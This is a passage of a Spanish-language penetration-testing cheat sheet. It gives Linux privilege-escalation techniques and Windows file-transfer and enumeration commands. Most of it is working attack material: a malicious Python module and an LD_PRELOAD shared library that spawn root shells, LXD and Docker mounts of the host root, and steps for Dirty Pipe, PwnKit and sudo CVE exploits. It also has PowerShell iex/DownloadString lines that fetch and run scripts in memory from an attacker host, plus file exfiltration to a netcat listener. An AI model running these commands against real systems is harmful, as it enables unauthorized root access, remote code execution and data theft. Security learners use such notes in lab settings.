os.system("/bin/bash -p")  # Spawnear shell privilegiada
```

Guardarlo en una ruta prioritaria

```bash
cp requests.py /usr/lib/python3.11/

# Al ejecutar el script:

/usr/bin/script.py  # ¡Shell como root!
```

##### Caso 2: Abuso de `PYTHONPATH` (si `sudo` permite `SETENV`)

**1. Verificar permisos `sudo`**:

```bash
sudo -l
(ALL : ALL) SETENV: NOPASSWD: /usr/bin/python
```

**2. Crear un módulo malicioso en /tmp**:

```bash
# /tmp/privesc.py
import os
os.system("chmod u+s /bin/bash")
```

**3. Ejecutar el script objetivo con PYTHONPATH manipulado**:

```bash
sudo PYTHONPATH=/tmp/ /usr/bin/python /home/elliot/script.py
```

#### LXC - LXD

**Linux Containers (LXC)** es una técnica de virtualización a nivel de sistema operativo que permite que varios sistemas Linux se ejecuten de forma aislada en un único host, al poseer sus propios procesos, pero compartir el kernel del sistema host. LXC es muy popular gracias a su facilidad de uso y se ha convertido en un componente esencial de la seguridad informática. 

**Linux Daemon (LXD)** es similar en algunos aspectos, pero está diseñado para contener un sistema operativo completo. Por lo tanto, no es un contenedor de aplicaciones, sino un contenedor de sistema. Antes de poder usar este servicio para escalar nuestros privilegios, debemos estar en el grupo `lxc` o `lxd`. Podemos averiguarlo con el siguiente comando: 

```
elliot@debian:~$ id

uid=1000(elliot) gid=1000(elliot) groups=1000(container-user),116(lxd)
```

##### Explotación

A continuación, se describe el proceso para explotar un contenedor LXD/LXC con privilegios elevados y obtener acceso de root en el sistema host. Este método implica la creación de un contenedor privilegiado que monta el sistema de archivos del host, permitiendo la modificación de archivos críticos como `/etc/shadow`.

**1. Descargar y transferir la imagen Alpine**:

Descarga la imagen mínima de Alpine Linux desde `https://github.com/saghul/lxd-alpine-builder.git`

```bash
git clone https://github.com/saghul/lxd-alpine-builder.git
```

**2. Transferir el archivo `alpine-v3.3-x86_64-20160114_2308.tar.gz`**

**3. Inicializar LXD**

Ejecutamos `lxd init` para inicializar el demonio de contenedores de Linux (**LXD**).

**4. Importar la imagen local**:

Usamos el siguiente comando para importar la imagen:

```bash
lxc image import alpine-v3.3-x86_64-20160114_2308.tar.gz --alias alpine
```

Verificamos la importación con:

```bash
lxc image list
```

**5. Crear un contenedor privilegiado**:

Iniciamos un contenedor con privilegios elevados usando:

```bash
lxc init alpine privesc -c security.privileged=true
```

- `alpine`: Nombre de la imagen.
- `privesc`: Nombre del contenedor.
- `security.privileged=true`: Permite que el contenedor se ejecute con los mismos privilegios que el usuario `root` en el host.

**6. Montar el sistema de archivos del host**:

Montamos todo el sistema de archivos del host (`/`) en el contenedor:

```bash
lxc config device add privesc mydev disk source=/ path=/mnt/root recursive=true
```

- `source=/`: Ruta del sistema de archivos del host.
- `path=/mnt/root`: Ruta de montaje en el contenedor.
- `recursive=true`: Asegura que todos los archivos y carpetas sean accesibles.

**7. Iniciar el contenedor**:

Iniciamos el contenedor con:

```bash
lxc start privesc
```

Verificamos el estado del contenedor con:

```bash
lxc list
```

**8. Ejecutar comandos dentro del contenedor**:

Accedemos a una shell dentro del contenedor:

```bash
lxc exec privesc /bin/sh
```

**9. Modificar el sistema de archivos del host**:

- Dentro del contenedor, navegamos a `/mnt/root` para acceder al sistema de archivos del host.
- Editamos archivos críticos como `/mnt/root/etc/shadow` para cambiar la contraseña de `root`.
- Esto permite iniciar sesión como `root` en el host.
- También podemos asignar permisos SUID al binario bash de `/mnt/bin/bash`.

#### Docker

Si somos miembros del grupo `docker`, podemos escalar nuestros privilegios a `root`.

La idea es montar el directorio `/` de la máquina host en nuestro contenedor. Una vez montado el directorio, tendremos acceso a `root` en nuestro contenedor y podremos manipular cualquier archivo del sistema de archivos del host a través del contenedor.

```bash
docker run -v /:/mnt -it alpine
```
Montamos el directorio `/` (raíz) del host en el directorio `/mnt` del contenedor y con la opción `-it` le indicamos que queremos ejecutar una termina interactiva y que la imágen base será `alpine`.

En caso de que la máquina víctima no tenga acceso a internet, podemos hacer lo siguiente:

- `docker pull alpine`: Descargamos la imagen de Alpine en nuestra máquina atacante.
- `docker save -o alpine.tar alpine`: Guardamos la imagen de Alpine en un archivo tar y la transferimos a la máquina víctima.
- `docker load -i alpine.tar`: Cargamos la imagen desde el archivo tar.
- `docker image ls`: Comprobamos que se cargo correctamente la imagen.
- `docker run -v /:/mnt -it alpine`: Creamos el contenedor.


#### Grupo `adm`

Los miembros del grupo `adm` pueden leer todos los archivos de logs ubicados en `/var/log`.

#### Grupo `disk`

Los miembros de este grupo tiene acceso completo dentro `/dev` como `/dev/sda`.

#### Capabilities

Las **Capabilities** de Linux son una característica de seguridad del sistema operativo Linux que permite otorgar privilegios específicos a los procesos, permitiéndoles realizar acciones específicas que de otro modo estarían restringidas. Esto permite un control más preciso sobre qué procesos tienen acceso a ciertos privilegios, haciéndolo más seguro que el modelo tradicional de Unix de otorgar privilegios a usuarios y grupos. 

A continuación se muestran algunas capacidades comunes disponibles en Linux: 

| Capability               | Descripción                                                                                                                                            |
| ------------------------ | ------------------------------------------------------------------------------------------------------------------------------------------------------ |
| **CAP_SYS_ADMIN**        | Permite realizar acciones con privilegios administrativos, como modificar archivos del sistema o cambiar configuraciones del sistema. administrativas. |
| **CAP_CHOWN**            | Cambiar la propiedad de archivos.                                                                                                                      |
| **CAP_DAC_OVERRIDE**     | Ignorar las verificaciones de permisos de lectura, escritura y ejecución de archivos.                                                                  |
| **CAP_DAC_READ_SEARCH**  | Ignorar las verificaciones de permisos de lectura de archivos.                                                                                         |
| **CAP_FOWNER**           | Ignorar las verificaciones de permisos que normalmente requieren ser el propietario del archivo.                                                       |
| **CAP_NET_ADMIN**        | Realizar diversas operaciones relacionadas con la red, como configurar interfaces.                                                                     |
| **CAP_NET_BIND_SERVICE** | Vincular (bind) a puertos de red por debajo del 1024.                                                                                                  |
| **CAP_SYS_MODULE**       | Cargar y descargar módulos del kernel.                                                                                                                 |
| **CAP_SYS_RAWIO**        | Realizar operaciones de entrada/salida (I/O) a bajo nivel.                                                                                             |
| **CAP_SYS_TIME**         | Modificar el reloj del sistema.                                                                                                                        |


##### Asignar una Capability

```bash
sudo setcap cap_net_bind_service=+ep /usr/bin/vim.basic
```

##### Eliminar una Capability

```bash
sudo setcap cap_net_bind_service=-ep /usr/bin/vim.basic
```

A continuación se muestran algunos ejemplos de valores que podemos utilizar con el comando `setcap`, junto con una breve descripción de lo que hacen: 

| Valor | Descripción                                                                                                                                                                                                   |
| ----- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `=`   | Establece la capacidad especificada para el ejecutable, pero **no otorga ningún privilegio**. Útil para borrar capacidades previamente asignadas.                                                             |
| `+ep` | Otorga al ejecutable los privilegios **efectivos** y **permitidos** para la capacidad especificada. Permite que el ejecutable realice acciones permitidas por la capacidad, pero no otras.                    |
| `+ei` | Otorga al ejecutable privilegios **efectivos** e **heredables** para la capacidad especificada. Permite que el ejecutable y los procesos secundarios hereden la capacidad y realicen las acciones permitidas. |
| `+p`  | Otorga al ejecutable los privilegios **permitidos** para la capacidad especificada. Permite que el ejecutable realice acciones permitidas, pero evita que la capacidad sea heredada por procesos secundarios. |

En Linux, se pueden utilizar diversas capacidades (capabilities) para escalar los privilegios de un usuario hasta obtener acceso de root. Estas capacidades permiten a los procesos realizar acciones específicas que normalmente están restringidas a usuarios con privilegios elevados. A continuación, se describen algunas de las capacidades más relevantes para este propósito:

| Capability           | Descripción                                                                                                                                                                                                      |
| -------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **CAP_SETUID**       | Permite que un proceso establezca su **ID de usuario efectivo**, lo que puede usarse para obtener los privilegios de otro usuario, incluido **root**.                                                            |
| **CAP_SETGID**       | Permite que un proceso establezca su **ID de grupo efectivo**, lo que puede usarse para obtener los privilegios de otro grupo, incluido el grupo **root**.                                                       |
| **CAP_SYS_ADMIN**    | Proporciona una amplia gama de privilegios administrativos, como modificar la configuración del sistema, montar y desmontar sistemas de archivos, y realizar otras acciones reservadas para el usuario **root**. |
| **CAP_DAC_OVERRIDE** | Permite omitir las verificaciones de permisos de lectura, escritura y ejecución de archivos, lo que facilita el acceso a archivos restringidos.                                                                  |

##### Enumerar binarios con capabilities

```bash
find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;
```

##### Explotación

Si hay capability configuradas en un binario, podemos usar esta capability para escalar privilegios.
Por ejemplo, si se establece la capability `CAP_SETUID`, esto se puede usar como una puerta trasera para mantener el acceso privilegiado manipulando su propio UID de proceso.

```bash
cp $(which python) .
sudo setcap cap_setuid+ep python

./python -c 'import os; os.setuid(0); os.system("/bin/sh")'
```

Referencias: [GTFOBins Capabilities](https://gtfobins.github.io/#+capabilities)

#### LD_PRELOAD Shared Library

Para realizar este ataque, se requiere:

- Un usuario con privilegios sudo que pueda ejecutar al menos un comando (no importa cuál).
- El uso de la variable de entorno `LD_PRELOAD` para lograr persistencia al invocar sudo.

##### Sobre las bibliotecas compartidas

Son archivos de código precompilado que múltiples programas pueden utilizar simultáneamente. Su propósito principal es:

- Modularizar el código, evitando duplicaciones.
- Permitir que distintas aplicaciones compartan funciones y recursos de manera eficiente.

##### ¿Qué es LD_PRELOAD?

Es una variable de entorno en sistemas Unix/Linux que fuerza la carga de una biblioteca compartida específica antes que las demás al ejecutar un programa. Esto permite:

- Sobrescribir funciones de bibliotecas estándar (útil para debugging o, en este caso, para explotación).
- Modificar el comportamiento de programas sin recompilarlos.

##### Ejemplo

```bash
elliot@debian:~$ sudo -l

Matching Defaults entries for daniel.carter on debian:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, env_keep+=LD_PRELOAD

User daniel.carter may run the following commands on debian:
    (root) NOPASSWD: /usr/sbin/apache2 restart
```

En el ejemplo anterior, observamos que:

- El usuario elliot tiene permisos para ejecutar el comando apache2 como root sin necesidad de ingresar la contraseña.
- La configuración de sudo incluye `env_keep+=LD_PRELOAD`, lo que significa que las variables de entorno (incluyendo `LD_PRELOAD`) se conservan al ejecutar comandos con sudo.

##### Pasos para el Ataque

**1. Creación de una Biblioteca Compartida Maliciosa**:

- Desarrollaremos una biblioteca compartida diseñada para sobrescribir funciones clave (ej: libc).

**2. Inyección mediante `LD_PRELOAD`**:

- Usaremos la variable LD_PRELOAD para cargar nuestra biblioteca maliciosa antes que las bibliotecas del sistema.

**3. Ejecución del Comando Privilegiado**:

- Al correr sudo `/usr/sbin/apache2 restart`, el sistema cargará nuestra biblioteca maliciosa debido a `LD_PRELOAD`, permitiéndonos ejecutar código arbitrario con privilegios de root.

##### Creación de bibliotecas compartidas maliciosas 

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```

Compilamos el código:

```bash
gcc -fPIC -shared -o privesc.so privesc.c -nostartfiles
```

Ejecutamos el código:

```bash
elliot@debian:~$ $: sudo LD_PRELOAD=/location_of_malicious_library/malicious.so /usr/bin/ping
root@@debian #: whoami
root
```

#### Dirty Pipe (CVE-2022-0847)

La vulnerabilidad [Dirty Pipe](https://dirtypipe.cm4all.com/) ([CVE-2022-0847](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-0847)) en el kernel de Linux permite escribir en archivos privilegiados del usuario root sin autorización. Técnicamente, es similar a la vulnerabilidad [Dirty Cow (2016)](https://dirtycow.ninja/) y afecta a los kernels desde la versión `5.8` hasta la `5.17`.

##### Impacto:

Permite a un usuario con solo permisos de lectura sobre un archivo modificarlo arbitrariamente.
También afecta a dispositivos Android, donde aplicaciones maliciosas (ejecutándose con permisos de usuario) podrían aprovecharla para tomar el control del dispositivo.

##### Fundamento técnico:
La vulnerabilidad explota el manejo incorrecto de pipes (tuberías), un mecanismo de comunicación unidireccional entre procesos en sistemas Unix. Por ejemplo, podría usarse para:

- Modificar /etc/passwd y eliminar la contraseña de root, permitiendo acceso con su sin autenticación.
- Sobrescribir binarios críticos o configuraciones del sistema.

##### Explotación:

- Descargar un Proof of Concept ([PoC](https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits)).
- Compilarlo y ejecutarlo en el sistema objetivo (o una réplica vulnerable).

```bash
elliot@debian:~$ git clone https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits.git
elliot@debian:~$ cd CVE-2022-0847-DirtyPipe-Exploits
elliot@debian:~$ bash compile.sh
elliot@debian:~$ ./exploit-1
Backing up /etc/passwd to /tmp/passwd.bak ...
Setting root password to "piped"...
Password: Restoring /etc/passwd from /tmp/passwd.bak...
Done! Popping shell... (run commands now)

# id

uid=0(root) gid=0(root) groups=0(root)
```

Con la ayuda de la segunda versión del exploit (`exploit-2`), podemos ejecutar binarios SUID con privilegios de root.

```bash
elliot@debian:~$ ./exploit-2 /usr/bin/sudo

[+] hijacking suid binary..
[+] dropping suid shell..
[+] restoring suid binary..
[+] popping root shell.. (dont forget to clean up /tmp/sh ;))

# id

uid=0(root) gid=0(root) groups=0(root)
```

#### CVE-2021-4034 - PwnKit

Se descubrió una grave vulnerabilidad de corrupción de memoria en la herramienta pkexec, identificada como CVE-2021-4034 y denominada PwnKit. Este fallo permitía la escalada de privilegios y permaneció oculto durante más de diez años, sin que se pueda determinar con exactitud cuándo fue explotado por primera vez. Finalmente, fue revelado públicamente en noviembre de 2021 y corregido dos meses después.
Explotación

Para aprovechar esta vulnerabilidad, es necesario:

- Descargar un Proof of Concept (PoC) diseñado para el ataque.
- Compilarlo directamente en el sistema objetivo o en una réplica del entorno vulnerable.

```bash
elliot@debian:~$ git clone https://github.com/arthepsy/CVE-2021-4034.git
elliot@debian:~$ cd CVE-2021-4034
elliot@debian:~$ gcc cve-2021-4034-poc.c -o poc
```

Una vez compilado el código, podemos ejecutarlo sin más. Obteniendo una shell como `root`.

```bash
elliot@debian:~$ ./poc

# id
uid=0(root) gid=0(root) groups=0(root)
```

#### CVE-2021-3156

Una de las vulnerabilidades más recientes de sudo, CVE-2021-3156, se basa en un desbordamiento de búfer basado en el heap. Esto afectó a las siguientes versiones de sudo:

- 1.8.31 - Ubuntu 20.04
- 1.8.27 - Debian 10
- 1.9.2 - Fedora 33
- y otros

Existe una [PoC](https://github.com/blasty/CVE-2021-3156) pública que se puede utilizar para esto.

```bash
git clone https://github.com/blasty/CVE-2021-3156.git
cd CVE-2021-3156
make
cat /etc/lsb-release
./sudo-hax-me-a-sandwich <target>
```

#### CVE-2019-14287

En 2019 se descubrió una vulnerabilidad crítica que afectaba a todas las versiones de Sudo anteriores a la 1.8.28, permitiendo la escalada de privilegios mediante un comando sencillo. Identificada como [CVE-2019-14287](https://www.sudo.ws/security/advisories/minus_1_uid/), esta vulnerabilidad solo requería un único requisito: que el archivo /etc/sudoers permitiera a un usuario ejecutar un comando específico.

Ejemplo Práctico

Al verificar los permisos con `sudo -l`, observamos que el usuario `elliot` tiene permitido ejecutar el comando `/usr/bin/id` en el sistema:

```bash
elliot@debian:~$ sudo -l
[sudo] password for elliot: **********

User elliot may run the following commands on Mrrobot:
    ALL=(ALL) /usr/bin/id
```

##### Explicación de la Vulnerabilidad

Sudo permite ejecutar comandos con IDs de usuario específicos, otorgando los privilegios del usuario asociado a dicho ID. Por ejemplo, el ID del usuario `elliot` se puede obtener del archivo `/etc/passwd`:

```bash
elliot@debian:~$ cat /etc/passwd | grep elliot
elliot:x:1000:1000:elliot,,,:/home/elliot:/bin/bash
```

Aquí, el ID de `elliot` es **1000**. Sin embargo, la vulnerabilidad radica en que, si se ingresa un ID negativo (como `-1`), Sudo lo interpreta como **0** (el ID de **root**). Esto permite obtener una shell con privilegios de root de manera inmediata:

```bash
elliot@debian2:~$ sudo -u#-1 id

root@debian:/home/elliot# id
uid=0(root) gid=1000(elliot) groups=1000(elliot)
```

##### Impacto

Este fallo permitía a cualquier usuario con permisos limitados en `/etc/sudoers` convertirse en root sin autenticación adicional, explotando un error en el manejo de IDs de usuario. La corrección en Sudo `1.8.28` invalidó esta técnica al bloquear el uso de IDs negativos.

### Utilidades

#### Crunch

```bash
crunch 6 6 -t Lab%%% > wordlist
```
#### Configuración de Fecha y Hora

```bash
sudo timedatectl set-timezone UTC
sudo timedatectl set-time '2015-11-20 18:00:00'
sudo timedatectl set-time 18:00:00
sudo timedatectl list-timezones
sudo timedatectl set-timezone '<COUNTRY>/<CITY>'
sudo timedatectl set-local-rtc 1
sudo net time -c <RHOST>
sudo net time set -S <RHOST>
sudo net time \\<RHOST> /set /y
sudo ntpdate <RHOST>
sudo ntpdate -b -u <RHOST>
sudo ntpdate -s <RHOST>
faketime "$(ntpdate -q DC01.certified.htb | cut -d ' ' -f 1,2)"
```
#### steghide

```bash
steghide --extract -sf irked.jpg
```
#### ident-user-enum

```bash
ident-user-enum <IP> [<PORT>]
```

## Windows

### Transferencia de archivos

Diferentes utilidades para las operaciones de transferencia de archivos en Windows.

#### Operaciones de Descarga

**Kali**

```bash
cat test.txt | base64 -w 0; echo
SGVsbG8gV29ybGQhCg==
```

```bash
md5sum test.txt
8ddd8be4b179a529afa5f2ffae4b9858  test.txt
```

**Máquina Víctima (Windows)**


```powershell
[IO.File]::WriteAllBytes("C:\\temp\\test.txt", [Convert]::FromBase64String("SGVsbG8gV29ybGQhCg=="))
```

Confirmación de la coincidencia de hashes MD5

```powershell
Get-FileHash C:\\temp\\test.txt -Algorithm md5

Algorithm   Hash                               Path
---------   ----                               ----
MD5         8DDD8BE4B179A529AFA5F2FFAE4B9858   C:\\temp\\test.txt
```

**System.Net.WebClient**

PowerShell ofrece muchas opciones de transferencia de archivos. En cualquier versión de PowerShell, la clase System.Net.WebClient se puede utilizar para descargar un archivo HTTP, HTTPS o FTP. La siguiente tabla describe los métodos de WebClient para descargar datos de un recurso:

| **Método**                                                                                                               | **Descripción**                                                                                                             |
| ------------------------------------------------------------------------------------------------------------------------ | --------------------------------------------------------------------------------------------------------------------------- |
| [OpenRead](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.openread?view=net-6.0)                       | Devuelve los datos de un recurso como [Stream](https://docs.microsoft.com/en-us/dotnet/api/system.io.stream?view=net-6.0) . |
| [OpenReadAsync](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.openreadasync?view=net-6.0)             | Devuelve los datos de un recurso sin bloquear el hilo de llamada.                                                           |
| [DownloadData](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloaddata?view=net-6.0)               | Descarga datos de un recurso y devuelve una matriz de bytes.                                                                |
| [DownloadDataAsync](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloaddataasync?view=net-6.0)     | Descarga datos de un recurso y devuelve una matriz de bytes sin bloquear el hilo de llamada.                                |
| [DownloadFile](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadfile?view=net-6.0)               | Descarga datos de un recurso a un archivo local.                                                                            |
| [DownloadFileAsync](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadfileasync?view=net-6.0)     | Descarga datos de un recurso a un archivo local sin bloquear el hilo de llamada.                                            |
| [DownloadString](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadstring?view=net-6.0)           | Descarga una cadena de un recurso y devuelve una cadena.                                                                    |
| [DownloadStringAsync](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadstringasync?view=net-6.0) | Descarga una cadena de un recurso sin bloquear el hilo de llamada.                                                          |

**Kali**

```bash
python3 -m http.server 80
```

**Máquina Víctima (Windows)**

```bash
(New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>')

(New-Object Net.WebClient).DownloadFile('<http://192.168.1.19/test.txt','C:\\temp\\test.txt>')
```

#### DownloadFileAsync

**Máquina Víctima (Windows)**

```bash
(New-Object Net.WebClient).DownloadFileAsync('<Target File URL>','<Output File Name>')

(New-Object Net.WebClient).DownloadFileAsync('<http://192.168.1.19/test.txt','C:\\temp\\test.txt>')
```

#### DownloadString

PowerShell también se puede utilizar para realizar ataques sin archivos. En lugar de descargar un script de PowerShell al disco, podemos ejecutarlo directamente en la memoria usando el cmdlet Invoke-Expression o el alias IEX.

```bash
iex (New-Object Net.WebClient).DownloadString("<http://192.168.1.19/script.ps1>")
```

`IEX` también acepta entrada de tubería.

```bash
(New-Object Net.WebClient).DownloadString("<http://192.168.1.19/script.ps1>") | iex
```

#### Invoke-WebRequest

A partir de PowerShell 3.0, el [cmdlet Invoke-WebRequest](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-webrequest?view=powershell-7.5&viewFallbackFrom=powershell-7.2) también está disponible, pero es notablemente más lento a la hora de descargar archivos. Puedes usar los alias iwr, curl, y wget en lugar del nombre completo Invoke-WebRequest.

```bash
Invoke-WebRequest "<http://192.168.1.19/script.ps1>" -OutFile script.ps1

iex (Invoke-WebRequest "<http://192.168.1.19/script.ps1>" -OutFile script.ps1)

Invoke-WebRequest "<http://192.168.1.19/script.ps1>" -OutFile script.ps1 | iex
```

### SMB

**Kali**

Creamos un servidor SMB con impacket-smbserver.

```bash
impacket-smbserver share -smb2support /tmp/smbshare
```

**copy**

```bash
copy \\\\192.168.220.133\\share\\nc.exe
```

> Las nuevas versiones de Windows bloquean el acceso de invitados no autenticados.

Para transferir archivos en este escenario, podemos establecer un nombre de usuario y contraseña usando nuestro servidor Impacket SMB y montar el servidor SMB en nuestra máquina de destino con Windows:

```bash
sudo impacket-smbserver share -smb2support /tmp/smbshare -user kali -password kali
```

```bash
net use n: \\\\192.168.1.19\\share /user:kali kali
```

### FTP

Otra forma de transferir archivos es mediante FTP (Protocolo de transferencia de archivos), que utiliza los puertos TCP/21 y TCP/20. Podemos utilizar el cliente FTP o PowerShell Net.WebClient para descargar archivos desde un servidor FTP.

Podemos configurar un Servidor FTP en nuestro host de ataque usando Python3 pyftpdlib módulo. Se puede instalar con el siguiente comando:

```bash
sudo pip3 install pyftpdlib
```

Configurar un servidor FTP Python3

```bash
sudo python3 -m pyftpdlib --port 21 -w
```

Una vez configurado el servidor FTP, podemos realizar transferencias de archivos utilizando el cliente FTP preinstalado desde Windows o PowerShell. Net.WebClient.

```bash
(New-Object Net.WebClient).DownloadFile("<ftp://192.168.1.19/test.txt>", "C:\\temp\\test.txt")
```

Creamos un archivo de comando para el cliente FTP y descargamos el archivo de destino.

```bash
C:\\temp> echo open 192.168.1.19 > ftpcommand.txt
C:\\temp> echo USER anonymous >> ftpcommand.txt
C:\\temp> echo binary >> ftpcommand.txt
C:\\temp> echo GET file.txt >> ftpcommand.txt
C:\\temp> echo bye >> ftpcommand.txt
C:\\temp> ftp -v -n -s:ftpcommand.txt
ftp> open 192.168.1.19
Log in with USER and PASS first.
ftp> USER anonymous

ftp> GET file.txt
ftp> bye

C:\\htb>more file.txt
This is a test file
```

### **Operaciones de Subida**

**Máquina Víctima (Windows)**

```bash
[Convert]::ToBase64String((Get-Content -Path "C:\\temp\\test.txt" -Encoding byte));
SGVsbG8gV29ybGQhCg==
```

**Kali**

```bash
echo "SGVsbG8gV29ybGQhCg==" | base64 -d;echo
```

#### PowerShell Web Uploads

PowerShell no tiene una función incorporada para operaciones de carga, pero podemos usar Invoke-WebRequest o Invoke-RestMethod para construir nuestra función de carga. También necesitaremos un servidor web que acepte cargas, lo cual no es una opción predeterminada en la mayoría de las utilidades de servidor web comunes.

Para nuestro servidor web, podemos usar [uploadserver](https://github.com/Densaugeo/uploadserver) , un módulo extendido del [módulo HTTP.server](https://docs.python.org/3/library/http.server.html) de Python , que incluye una página de carga de archivos.

```bash
sudo pip3 install uploadserver
python3 -m uploadserver
```

Script de PowerShell para cargar un archivo al servidor de carga de Python

```bash
Invoke-FileUpload -Uri <http://192.168.1.19:80/upload> -File C:\\Windows\\System32\\drivers\\etc\\hosts
```

#### PowerShell Base64 Web Upload

Otra forma de utilizar archivos codificados en PowerShell y base64 para operaciones de carga es mediante el uso `Invoke-WebRequest` o `Invoke-RestMethod` junto con Netcat. Usamos Netcat para escuchar en un puerto que especificamos y enviamos el archivo como petición POST. Finalmente, copiamos la salida y usamos la función de decodificación base64 para convertir la cadena base64 en un archivo.

```bash
PS C:\\temp> $b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\\Windows\\System32\\drivers\\etc\\hosts' -Encoding Byte))
PS C:\\temp> Invoke-WebRequest -Uri <http://192.168.49.128:8000/> -Method POST -Body $b64
```

Captamos los datos base64 con Netcat y usamos la aplicación base64 con la opción de decodificación para convertir la cadena en el archivo.

```bash
nc -lnvp 8000
listening on [any] 8000 ...
connect to [192.168.1.19] from (UNKNOWN) [192.168.1.15] 62601
POST / HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.22621.4111
Content-Type: application/x-www-form-urlencoded
Host: 192.168.1.19:8000
Content-Length: 1140
Connection: Keep-Alive

IyBDb3B5cmlnaHQgKGMpIDE5OTMtMjAwOSBNaWNyb3NvZnQgQ29ycC4NCiMNCiMgVGhpcyBpcyBhIHNhbXBsZSBIT1NUUyBmaWxlIHVzZWQgYnkgTWljcm9zb2Z0IFRDUC9JUCBmb3IgV2luZG93cy4NCiMNCiMgVGhpcyBmaWxlIGNvbnRhaW5zIHRoZSBtYXBwaW5ncyBvZiBJUCBhZGRyZXNzZXMgdG8gaG9zdCBuYW1lcy4gRWFjaA0KIyBlbnRyeSBzaG91bGQgYmUga2VwdCBvbiBhbiBpbmRpdmlkdWFsIGxpbmUuIFRoZSBJUCBhZGRyZXNzIHNob3VsZA0KIyBiZSBwbGFjZWQgaW4gdGhlIGZpcnN0IGNvbHVtbiBmb2xsb3dlZCBieSB0aGUgY29ycmVzcG9uZGluZyBob3N0IG5hbWUuDQojIFRoZSBJUCBhZGRyZXNzIGFuZCB0aGUgaG9zdCBuYW1lIHNob3VsZCBiZSBzZXBhcmF0ZWQgYnkgYXQgbGVhc3Qgb25lDQojIHNwYWNlLg0KIw0KIyBBZGRpdGlvbmFsbHksIGNvbW1lbnRzIChzdWNoIGFzIHRoZXNlKSBtYXkgYmUgaW5zZXJ0ZWQgb24gaW5kaXZpZHVhbA0KIyBsaW5lcyBvciBmb2xsb3dpbmcgdGhlIG1hY2hpbmUgbmFtZSBkZW5vdGVkIGJ5IGEgJyMnIHN5bWJvbC4NCiMNCiMgRm9yIGV4YW1wbGU6DQojDQojICAgICAgMTAyLjU0Ljk0Ljk3ICAgICByaGluby5hY21lLmNvbSAgICAgICAgICAjIHNvdXJjZSBzZXJ2ZXINCiMgICAgICAgMzguMjUuNjMuMTAgICAgIHguYWNtZS5jb20gICAgICAgICAgICAgICMgeCBjbGllbnQgaG9zdA0KDQojIGxvY2FsaG9zdCBuYW1lIHJlc29sdXRpb24gaXMgaGFuZGxlZCB3aXRoaW4gRE5TIGl0c2VsZi4NCiMJMTI3LjAuMC4xICAgICAgIGxvY2FsaG9zdA0KIwk6OjEgICAgICAgICAgICAgbG9jYWxob3N0DQoNCjEyNy4wLjAuMSBjcnlwdG9tYXRvci12YXVsdA0K
```

```bash
echo <base64> | base64 -d -w 0 > hosts
```

### Enumeración

#### Sistema

```powershell
hostname

# Devuelve True si un equipo forma parte de un dominio
(Get-WmiObject -Class Win32_ComputerSystem).PartOfDomain

qwinsta

query user

systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
[System.Environment]::OSVersion.Version
Get-ComputerInfo
Get-ComputerInfo | Select OsName,OsVersion,OsType

# variable de entorno
echo %PATH%
set
Get-ChildItem Env: | ft Key,Value

# Parches
wmic qfe get Caption, Description, HotFixID, InstalledOn
Get-CimInstance -Class win32_quickfixengineering | Where-Object { $_.Description -eq "Security Update" }

# Actualizaciones del sistema
wmic qfe list brief

# Lista los procesos en ejecución
tasklist /svc

tasklist /v | findstr /i xampp-control.exe

# Lista los procesos en ejecución
Get-Process
Get-Process | Select-Object Name, Path
Get-WmiObject Win32_Process -Filter "name = 'notepad.exe'" | Select-Object Name, ExecutablePath

# Listar procesos NO estandar, procesos que no están en las carpetas del sistema
Get-Process | Where-Object { $_.Path -notmatch "C:\\Windows\\System32" -and $_.Path -notmatch "C:\\Windows\\SysWOW64" } | Select-Object ProcessName, Id, Path

# Parches
Get-HotFix | ft -AutoSize

# Programas instalados
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
Get-WmiObject -Class Win32_Product |  select Name, Version
wmic product get name

# Lista los modulos
Get-Module

Get-ExecutionPolicy -List

# Listar las reglas de AppLocker
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

# Probar la política de AppLocker
Get-AppLockerPolicy -Local | Test-AppLockerPolicy -path C:\Windows\System32\cmd.exe -User Everyone

# Obtener el historial de PowerShell del usuario especificado
Get-Content C:\Users\<USERNAME>\AppData\Roaming\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt

# Confirmar si UAC esta habilitado
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA

# Comprobar el nivel de UAC
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin
```

#### Usuarios

```powershell
whoami all
whoami /priv
whoami /groups

net users
net user <USER>
net user <USER> /domain
net user %username%
Get-LocalUser

# Información acerca del requerimiento de contraseña
net accounts
net accounts /domain

# Crear usuario
net user /add <USERNAME> <PASSWORD>

echo "%USERDOMAIN%"
echo %logonserver%
